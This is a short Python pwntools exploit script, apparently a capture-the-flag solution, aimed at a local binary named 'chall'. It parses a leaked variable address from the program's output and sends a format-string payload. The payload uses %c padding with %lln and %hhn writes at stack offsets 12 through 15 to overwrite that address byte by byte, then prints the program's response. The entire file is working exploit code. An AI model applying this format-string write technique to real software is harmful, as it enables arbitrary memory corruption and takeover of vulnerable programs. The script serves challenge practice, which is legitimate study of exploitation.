from pwn import *

target = process('./chall')

target.recvuntil(b"variable @ ")
addr = target.recvuntil(b" ")[:-1].strip().decode()
addr = int(addr, 16)
log.info(hex(addr))


payload = b"%222c%12$lln"
payload += b"%226c%13$hhn"
payload += b"%47c%14$hhn"
payload += b"%207c%15$hhn"
payload += b"A"
payload += p64(addr)+p64(addr+1)+p64(addr+2)+p64(addr+3)

target.sendline(payload)

s = target.recvall().decode('latin-1')
print(s)



